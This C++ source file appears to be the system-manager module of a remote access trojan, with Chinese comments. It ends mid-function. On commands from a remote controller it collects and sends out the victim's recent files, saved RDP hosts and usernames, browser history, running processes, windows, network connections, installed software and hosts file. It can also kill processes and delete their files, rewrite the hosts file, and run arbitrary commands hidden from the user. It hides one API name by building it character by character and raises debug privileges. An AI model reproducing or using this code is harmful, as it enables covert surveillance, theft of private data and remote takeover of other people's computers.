// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "SystemManager.h"
#include <WtsApi32.h>
#include <stdio.h>
////////////////////////
#include <tlhelp32.h>
#include <psapi.h>
#include<ShlObj.h>
#pragma comment(lib,"Psapi.lib")
#include "../../PublicInclude/until.h"
#include "GetNetState.h"

//获取系统平台
BOOL GetOSVerIs64Bit() 
{
	BOOL bRet = FALSE;
	SYSTEM_INFO si;
	typedef VOID(__stdcall* GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
	GETNATIVESYSTEMINFO fnGetNativeSystemInfo;
	char yGyioJf[] = { 'G','e','t','N','a','t','i','v','e','S','y','s','t','e','m','I','n','f','o','\0' };
	fnGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), yGyioJf);
	if (fnGetNativeSystemInfo != NULL)
	{
		fnGetNativeSystemInfo(&si);
		if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		{
			bRet = TRUE;
		}
	}
	return bRet;
}

//权限提升
BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////////////////
CSystemManager::CSystemManager(CClientSocket* pClient) : CManager(pClient)
{
	
	SendProcessList();
}

CSystemManager::~CSystemManager()
{
	//ExitProcess(NULL);
}

BOOL CSystemManager::FindLnkPath(char* lnk, char* bug, DWORD SIZE)
{
	BOOL ret = FALSE;
	HRESULT           hres;
	IShellLink* psl;
	IPersistFile* ppf;
	WIN32_FIND_DATA   fd;

	CoInitialize(NULL);

	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&psl);
	if (!SUCCEEDED(hres))
		return   false;

	hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
	if (SUCCEEDED(hres))
	{
		//转宽字节
		WCHAR wsz[MAX_PATH];
		MultiByteToWideChar(CP_ACP, 0, lnk, -1, wsz, MAX_PATH);

		//加载文件
		hres = ppf->Load(wsz, STGM_READ);

		//查询
		if (SUCCEEDED(hres))
		{
			hres = psl->GetPath(bug, SIZE, &fd, 0);
			ret = TRUE;
		}

		ppf->Release();
	}
	psl->Release();

	return ret;
}

LPBYTE CSystemManager::GeHistoryFileList()
{
	char name[0x30] = { 0 };
	DWORD size = sizeof(name);
	char path[MAX_PATH] = { 0 };
	char path2[MAX_PATH] = { 0 };
	PBYTE lpList = NULL;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;

	if (GetUserNameA(name, &size))
	{
		sprintf(path, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*", name);

		DWORD	nBufferSize = 1024 * 10; // 先分配10K的缓冲区
		WIN32_FIND_DATA	FindFileData;

		lpList = (BYTE*)LocalAlloc(LPTR, nBufferSize);
		HANDLE hFile = FindFirstFile(path, &FindFileData);
		//文件打开失败则释放内存返回
		if (hFile == INVALID_HANDLE_VALUE)
		{
			LocalFree(lpList);
			return NULL;
		}

		//赋值数据头
		*lpList = TOKEN_IHFILE;
		dwOffset = 1;

		//开始遍历
		do
		{
			// 动态扩展缓冲区
			if (dwOffset > (nBufferSize - MAX_PATH * 2))
			{
				nBufferSize += MAX_PATH * 2;
				lpList = (BYTE*)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
			}


			char* pszFileName = FindFileData.cFileName;

			if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
				continue;

			sprintf(path, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\%s", name, pszFileName);

			if (FindLnkPath(path, path2, MAX_PATH))
			{
				//计算文件名长度拷贝到缓冲区
				nLen = lstrlen(path2);
				memcpy(lpList + dwOffset, path2, nLen);
			}
			else
			{
				//计算文件名长度拷贝到缓冲区
				nLen = lstrlen(pszFileName);
				memcpy(lpList + dwOffset, pszFileName, nLen);
			}
			//修正偏移
			dwOffset += nLen;
			//追加分隔符
			*(lpList + dwOffset) = 0;
			dwOffset++;

			// 最后访问时间 8 字节
			memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
			dwOffset += 8;

		} while (FindNextFile(hFile, &FindFileData));

		FindClose(hFile);
	}

	return lpList;
}

void CSystemManager::SendHistoryFileList()
{
	LPBYTE	lpBuffer = GeHistoryFileList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

//获取远程连接记录
LPBYTE CSystemManager::GetRemoteList()
{
	DWORD strlens = 0;
	PBYTE lpList = NULL;   //返回的指针
	DWORD	nBufferSize = 1024 * 3; // 先分配3K的缓冲区
	DWORD	dwOffset = 0; // 位移指针
	HKEY hKey = NULL; //遍历注册表的句柄
	HKEY hKey2 = NULL;  //读取值的句柄
	DWORD dwIndexs = 0; //需要返回子项的索引 
	TCHAR keyName[MAX_PATH] = { 0 }; //保存子键的名称
	TCHAR path[MAX_PATH] = { 0 };		//拼接路径
	CHAR username[MAX_PATH];
	DWORD len = MAX_PATH;
	DWORD charLength = 256;  //想要读取多少字节并返回实际读取到的字符长度
	DWORD dwType = REG_SZ;
	char* subKey = "SOFTWARE\\Microsoft\\Terminal Server Client\\Servers";
	lpList = (BYTE*)LocalAlloc(LPTR, nBufferSize);
	//赋值数据头
	*lpList = TOKEN_REMOTE;
	dwOffset = 1;

	__try {

		if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			while (RegEnumKeyEx(hKey, dwIndexs, keyName, &charLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
			{
				++dwIndexs;
				sprintf(path, "%s\\%s\\", subKey, keyName);

				if (RegOpenKeyExA(HKEY_CURRENT_USER, path, NULL, KEY_READ, &hKey2) == ERROR_SUCCESS)
				{
					if (RegQueryValueExA(hKey2, "UsernameHint", NULL, &dwType, (LPBYTE)username, &len) == ERROR_SUCCESS)
					{
						len = MAX_PATH;
						strlens = strlen(keyName);
						memcpy(lpList + dwOffset, keyName, strlens);

						dwOffset += strlens;
						*(lpList + dwOffset) = 0;
						dwOffset++;

						strlens = strlen(username);
						memcpy(lpList + dwOffset, username, strlens);
						dwOffset += strlens;
						*(lpList + dwOffset) = 0;
						dwOffset++;
					}

					RegCloseKey(hKey2);
				}
				charLength = 256;
			}
		}
		if (hKey != NULL)
		{
			RegCloseKey(hKey);
		}
	
	}

	__except(1)
	{
		LocalFree(lpList);
		lpList = NULL;
	}

	return lpList;
}

void CSystemManager::SendRemoteList()
{
	
	LPBYTE	lpBuffer = GetRemoteList();
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();

	switch (lpBuffer[0])
	{
	case COMMAND_REMOTE:         //发送远程连接记录
		SendRemoteList();
		break;
	case COMMAND_IHFILE:         //发送历史访问文件
		SendHistoryFileList();
		break;
	case COMMAND_PSLIST:         //发送进程列表
		SendProcessList();
		break;
	case COMMAND_WSLIST:         //发送窗口列表
		SendWindowsList();
		break;
	case COMMAND_KILLPROCESS:    //关闭进程
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1,0);
		break;
	case COMMAND_KILLPROCESSDEL:    //关闭进程并删除
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1,1);
		break;
	case COMMAND_WINDOW_CLOSE:   //向窗口发送关闭消息
		CloseWindow(lpBuffer + 1);
		break;
	case COMMAND_WINDOW_TEST:    //隐藏窗口|显示窗口|最小化|最大化
		TestWindow(lpBuffer + 1);
		break;
	case COMMAND_SOFTWARELIST:   //发送软件信息列表
		SendSoftWareList();
		break;
	case COMMAND_IHLIST:         //发送IE浏览记录
		SendIEHistoryList();
		break;
	case COMMAND_NSLIST:         //发送网络连接信息列表
		SendNetStateList();
		break;
	case COMMAND_GETHOSTS:       //发送Hosts文件内容
		SendHostsFileInfo();
		break;
	case COMMAND_SETHOSTS:       //修改Hosts文件内容
		SaveHostsFileInfo(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_STARTUP:				//启动项
		SendStartupList();
		break;
	case COMMAND_APPUNINSTALL:				//卸载
		WinExec((LPCSTR)lpBuffer + 1, SW_HIDE);
		break;
		
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{

	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendHostsFileInfo()
{
	char szHostsFile[MAX_PATH] = { 0 };
	BOOL bIsWow64 = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwSize = 0, dwRead;
	LPBYTE lpBuffer = NULL;

	GetWindowsDirectory(szHostsFile, sizeof(szHostsFile));
	::IsWow64Process(::GetCurrentProcess(), &bIsWow64);
	if (bIsWow64)
		strcat(szHostsFile, "\\sysnative\\drivers\\etc\\hosts");
	else
		strcat(szHostsFile, "\\system32\\drivers\\etc\\hosts");

	SetFileAttributes(szHostsFile, FILE_ATTRIBUTE_NORMAL);
	hFile = CreateFile(szHostsFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	dwSize = GetFileSize(hFile, NULL);
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwSize + 2);
	if (!ReadFile(hFile, lpBuffer + 1, dwSize, &dwRead, NULL))
	{
		LocalFree(lpBuffer);
		CloseHandle(hFile);
		return;
	}
	CloseHandle(hFile);

	lpBuffer[0] = TOKEN_HOSTSINFO;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SaveHostsFileInfo(LPBYTE lpBuffer, UINT nSize)
{
	char szHostsFile[MAX_PATH] = { 0 };
	BOOL bIsWow64 = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwWritten;

	GetWindowsDirectory(szHostsFile, sizeof(szHostsFile));
	::IsWow64Process(::GetCurrentProcess(), &bIsWow64);
	if (bIsWow64)
		strcat(szHostsFile, "\\sysnative\\drivers\\etc\\hosts");
	else
		strcat(szHostsFile, "\\system32\\drivers\\etc\\hosts");

	SetFileAttributes(szHostsFile, FILE_ATTRIBUTE_NORMAL);
	hFile = CreateFile(szHostsFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	if (!WriteFile(hFile, lpBuffer, nSize, &dwWritten, NULL))
	{
		CloseHandle(hFile);
		return;
	}
	CloseHandle(hFile);
}

void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize,BOOL Flag)  //关闭程序
{
	HANDLE hProcess = NULL;
	DWORD SIZE = MAX_PATH;
	char path[MAX_PATH] = { 0 };
	DWORD access = Flag ? PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE : PROCESS_TERMINATE;
	BOOL success = false;
	for (unsigned int i = 0; i < nSize; i += 4)
	{
		DWORD Ipsid = *(LPDWORD)(lpBuffer + i);
		hProcess = OpenProcess(access,0, Ipsid);

		if (hProcess)
		{
			//判断是否需要删除
			if (Flag)
			{
				success = QueryFullProcessImageNameA(hProcess, 0, path, &SIZE);
			}

			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
			//稍稍Sleep下，防止出错
			Sleep(500);
			if (Flag && success)
			{
				DeleteFileA(path);
			}

		}
	}

	
	//稍稍Sleep下，防止出错
	Sleep(500);
	//刷新进程列表
	SendProcessList();
	//刷新网络连接列表
	SendNetStateList();
	//刷新窗口列表
	SendWindowsList();	
}

LPBYTE CSystemManager::getProcessList()
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE			hProcessSnap = NULL;
	HANDLE			hProcess = NULL;
	PROCESSENTRY32	pe32 = { 0 };
	char			szProcPriority[64] = { 0 };
	char			szThreadsCount[32] = { 0 };
	char			szProcUserName[64] = { 0 };
	char			szProcMemUsed[128] = { 0 };
	char			szProcFileName[MAX_PATH] = { 0 };
	char           dwFileSize[32] = {0}; //文件大小
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	int NUMdwFileSize = 0;
	// 获取系统进程快照
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024); //暂时分配一下缓冲区
	if (lpBuffer)
	{
		lpBuffer[0] = TOKEN_PSLIST;
	}
	else
	{
		CloseHandle(hProcessSnap);
		return NULL;
	}

	dwOffset = 1;

	// 输出进程相关信息的内容
	for (BOOL bPE32 = Process32First(hProcessSnap, &pe32); bPE32; bPE32 = Process32Next(hProcessSnap, &pe32))
	{
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);

		// 获取进程优先级
		ZeroMemory(szProcPriority, sizeof(szProcPriority));
		switch (GetPriorityClass(hProcess))
		{
		case REALTIME_PRIORITY_CLASS:
			strcpy(szProcPriority, "实时");
			break;
		case HIGH_PRIORITY_CLASS:
			strcpy(szProcPriority, "高");
			break;
		case ABOVE_NORMAL_PRIORITY_CLASS:
			strcpy(szProcPriority, "高于标准");
			break;
		case NORMAL_PRIORITY_CLASS:
			strcpy(szProcPriority, "标准");
			break;
		case BELOW_NORMAL_PRIORITY_CLASS:
			strcpy(szProcPriority, "低于标准");
			break;
		case IDLE_PRIORITY_CLASS:
			strcpy(szProcPriority, "低");
			break;
		}

		// 获取进程线程数
		sprintf(szThreadsCount, "%5u", pe32.cntThreads);

		// 获取进程用户名
		HANDLE hProcToken = NULL; SID_NAME_USE snu;
		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hProcToken))
		{
			DWORD dwReturnLength, dwUserSize = sizeof(szProcUserName);
			char szDomainName[128] = { 0 }; DWORD dwDomainName = sizeof(szDomainName);

			GetTokenInformation(hProcToken, TokenUser, NULL, 0, &dwReturnLength);
			PTOKEN_USER	pTokenUser = (PTOKEN_USER)malloc(dwReturnLength);
			GetTokenInformation(hProcToken, TokenUser, pTokenUser, dwReturnLength, &dwReturnLength);
			LookupAccountSid(NULL, pTokenUser->User.Sid, szProcUserName, &dwUserSize, szDomainName, &dwDomainName, &snu);
			free(pTokenUser);
			CloseHandle(hProcToken);
		}
		else ZeroMemory(szProcUserName, sizeof(szProcUserName));

		// 获取进程占用内存
		PROCESS_MEMORY_COUNTERS pmc = { 0 };
		if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc)))
		{
			sprintf(szProcMemUsed, "%7u K", pmc.WorkingSetSize / 1024);
		}
		else ZeroMemory(szProcMemUsed, sizeof(szProcMemUsed));

		// 得到自身的完整名称
		if (GetModuleFileNameEx(hProcess, NULL, szProcFileName, sizeof(szProcFileName)))
		{
			char szWinDir[MAX_PATH] = { 0 }, szBuffer[MAX_PATH] = { 0 };
			GetWindowsDirectory(szWinDir, sizeof(szWinDir));
			if (strnicmp(szProcFileName, "\\SystemRoot", 11) == 0)
			{
				strcpy(szBuffer, szWinDir);
				strcat(szBuffer, szProcFileName + 11);
				strcpy(szProcFileName, szBuffer);

			}
			else if (strnicmp(szProcFileName, "\\??\\", 4) == 0)
			{
				strcpy(szBuffer, szProcFileName + 4);
				strcpy(szProcFileName, szBuffer);
			}
			else if (strnicmp(szProcFileName, "\\\\?\\", 4) == 0)
			{
				strcpy(szBuffer, szProcFileName + 4);
				strcpy(szProcFileName, szBuffer);
			}

			HANDLE handle = CreateFile(szProcFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
			if (handle != INVALID_HANDLE_VALUE)
			{
				NUMdwFileSize = GetFileSize(handle, NULL) / 1024;
				sprintf(dwFileSize, "%d", NUMdwFileSize);
				CloseHandle(handle);
			}
			else
			{
				NUMdwFileSize = 0;
				sprintf(dwFileSize, "%d", NUMdwFileSize);
			}
		}
		else strcpy(szProcFileName, "?");

		dwLength = sizeof(DWORD) +
			lstrlen(pe32.szExeFile) + 1 +
			lstrlen(szProcPriority) + 1 +
			lstrlen(szThreadsCount) + 1 +
			lstrlen(szProcUserName) + 1 +
			lstrlen(szProcMemUsed) + 1 +
			lstrlen(dwFileSize) + 1 +
			lstrlen(szProcFileName) + 1;

		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);
	
	
			
		// 数据结构: 进程ID+进程名+优先级+线程数+占用内存+文件大小+进程完整名
		memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));        // 进程ID
		dwOffset += sizeof(DWORD);

		memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1); // 进程名
		dwOffset += lstrlen(pe32.szExeFile) + 1;

		memcpy(lpBuffer + dwOffset, szProcPriority, lstrlen(szProcPriority) + 1); // 优先级
		dwOffset += lstrlen(szProcPriority) + 1;

		memcpy(lpBuffer + dwOffset, szThreadsCount, lstrlen(szThreadsCount) + 1); // 线程数
		dwOffset += lstrlen(szThreadsCount) + 1;

		memcpy(lpBuffer + dwOffset, szProcUserName, lstrlen(szProcUserName) + 1); // 用户名
		dwOffset += lstrlen(szProcUserName) + 1;

		memcpy(lpBuffer + dwOffset, szProcMemUsed, lstrlen(szProcMemUsed) + 1);   // 占用内存
		dwOffset += lstrlen(szProcMemUsed) + 1;

		memcpy(lpBuffer + dwOffset, &dwFileSize, lstrlen(dwFileSize) + 1);   // 文件大小
		dwOffset += lstrlen(dwFileSize) + 1;

		memcpy(lpBuffer + dwOffset, szProcFileName, lstrlen(szProcFileName) + 1); // 进程完整名
		dwOffset += lstrlen(szProcFileName) + 1;

		CloseHandle(hProcess);
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	CloseHandle(hProcessSnap);

	EnablePrivilege(SE_DEBUG_NAME, FALSE);
	return lpBuffer;
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE*)lParam;
	char	strTitle[1024];

	try
	{
		GetWindowText(hwnd, strTitle, sizeof(strTitle) - 1);
		strTitle[sizeof(strTitle) - 1] = 0;
		if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
			return true;
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset = 1;
		}
		else
		{
			dwOffset = LocalSize(lpBuffer);
			while (*(lpBuffer + dwOffset - 2) == 0) dwOffset--;
		}
		dwLength = sizeof(DWORD) + sizeof(HWND) + lstrlen(strTitle) + 1;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	}
	catch (...)
	{
		return true;
	}

	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), &hwnd, sizeof(HWND));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD) + sizeof(HWND), strTitle, lstrlen(strTitle) + 1);

	*(LPBYTE*)lParam = lpBuffer;
	return true;
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}

BOOL GetTokenByName(HANDLE& hToken, LPSTR lpName)
{
	if (!lpName)
	{
		return FALSE;
	}
	HANDLE         hProcessSnap = NULL;
	BOOL           bRet = FALSE;
	PROCESSENTRY32 pe32 = { 0 };

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return (FALSE);

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			_strupr(pe32.szExeFile);
			if (!strcmp(pe32.szExeFile, lpName))
			{
				HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
				CloseHandle(hProcessSnap);
				return (bRet);
			}
		} while (Process32Next(hProcessSnap, &pe32));
		bRet = TRUE;
	}
	else
		bRet = FALSE;

	CloseHandle(hProcessSnap);
	return (bRet);
}

BOOL GetCurrentUserName(char* szUserName)
{
	LPSTR lpUserName = NULL;
	DWORD dwUserSize = 0;

	if (WTSQuerySessionInformation(NULL, WTS_CURRENT_SESSION, WTSUserName, &lpUserName, &dwUserSize))
	{
		strcpy(szUserName, lpUserName);
		WTSFreeMemory(lpUserName);
		if (!strlen(szUserName))
		{
			strcpy(szUserName, "无用户登陆状态!");
			return FALSE;
		}
		return TRUE;
	}
	strcpy(szUserName, "无用户登陆状态!");
	return FALSE;
}

void CSystemManager::CloseWindow(LPBYTE buf)
{
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));            //得到窗口句柄 
	::PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0); //向窗口发送关闭消息

	Sleep(200);
	SendWindowsList();  //窗口显示刷新
}

void CSystemManager::TestWindow(LPBYTE buf)
{
	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(DWORD));        //得到窗口句柄
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD)); //得到窗口处理参数
	ShowWindow((HWND__*)hwnd, dHow);
}

void CSystemManager::SendNetStateList()
{
	LPBYTE	lpBuffer = getNetStateList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


void CSystemManager::SendIEHistoryList()
{
	LPBYTE	lpBuffer = getIEHistoryList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

#include  <urlhist.h>   //   Needed   for   IUrlHistoryStg2   and   IID_IUrlHistoryStg2
#include  <COMDEF.H>
#include<ShlGuid.h>
inline char* UnicodeToAnsi(const wchar_t* szStr)
{
	int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
	if (nLen == 0)
	{
		return "未知";
	}
	char* pResult = new char[nLen];
	WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
	return pResult;
}



LPBYTE CSystemManager::getIEHistoryList()
{
	HRESULT   hr;
	IUrlHistoryStg2* puhs;
	IEnumSTATURL* pesu;
	STATURL   su;
	ULONG   celt = 0;
	//  _bstr_t   bstr; 
	CoInitialize(NULL);
	hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg, (LPVOID*)&puhs);

	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpBuffer[0] = TOKEN_IHLIST;
	dwOffset = 1;

	char strTime[50] = { 0 };
	char* strUrl, * strTitle;
	if (SUCCEEDED(hr))
	{
		hr = puhs->EnumUrls(&pesu);
		if (SUCCEEDED(hr))
		{
			while (SUCCEEDED(pesu->Next(1, &su, &celt)) && celt > 0)
			{
				strUrl = UnicodeToAnsi(su.pwcsUrl);
				strTitle = UnicodeToAnsi(su.pwcsTitle);

				SYSTEMTIME  st;
				FileTimeToSystemTime(&su.ftLastVisited, &st);
				wsprintf(strTime, "%d-%d-%d %d:%d:%d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wSecond, st.wMinute);

				dwLength = lstrlen(strUrl) + lstrlen(strTitle) + lstrlen(strTime) + 3;

				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, strTime, lstrlen(strTime) + 1);
				dwOffset += lstrlen(strTime) + 1;

				memcpy(lpBuffer + dwOffset, strTitle, lstrlen(strTitle) + 1);
				dwOffset += lstrlen(strTitle) + 1;

				memcpy(lpBuffer + dwOffset, strUrl, lstrlen(strUrl) + 1);
				dwOffset += lstrlen(strUrl) + 1;

				if (strcmp(strTitle, "未知"))
					delete[] strTitle;
				if (strcmp(strUrl, "未知"))
					delete[] strUrl;
			}

			puhs->Release();
		}
	}
	CoUninitialize();

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	return lpBuffer;
}

LPBYTE CSystemManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = { 0 };
	TCHAR regDisplayName[MAX_LEG] = { 0 };
	TCHAR regPublisher[MAX_LEG] = { 0 };
	TCHAR regDisplayVersion[MAX_LEG] = { 0 };
	TCHAR regInstallDate[MAX_LEG] = { 0 };
	TCHAR regUninstallString[MAX_LEG] = { 0 };

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if (lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_SOFTWARE;

	int n = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = { 0 };
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			for (int i = 0; i < (int)dwRegNum; i++)
			{
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType;
				HKEY hSubKey;
				if (RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{
					dwRegSize = MAX_LEG;
					memset(regDisplayName, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);

					dwRegSize = MAX_LEG;
					memset(regBufferValue, 0, MAX_LEG);
					// 取ParentKeyName键值,判断是否是补丁信息, 是补丁信息键值为"OperatingSystem"
					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if (lstrlen(regDisplayName) == 0 || lstrcmp(regBufferValue, "OperatingSystem") == 0) //判断是否是补丁信息 
					{
						continue;
					}

					dwRegSize = MAX_LEG;
					memset(regPublisher, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "Publisher", 0, &dwType, (LPBYTE)regPublisher, &dwRegSize);

					dwRegSize = MAX_LEG;
					memset(regDisplayVersion, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

					dwRegSize = MAX_LEG;
					memset(regInstallDate, 0, MAX_LEG);
					// 判断是否能在注册表中获取到安装时间, 否取子项创建时间
					if (RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS)
					{
						TCHAR Year[5], Month[5], Day[5];
						lstrcpyn(Year, regInstallDate, 5);
						lstrcpyn(Month, regInstallDate + 4, 3);
						lstrcpyn(Day, regInstallDate + 4 + 2, 3);
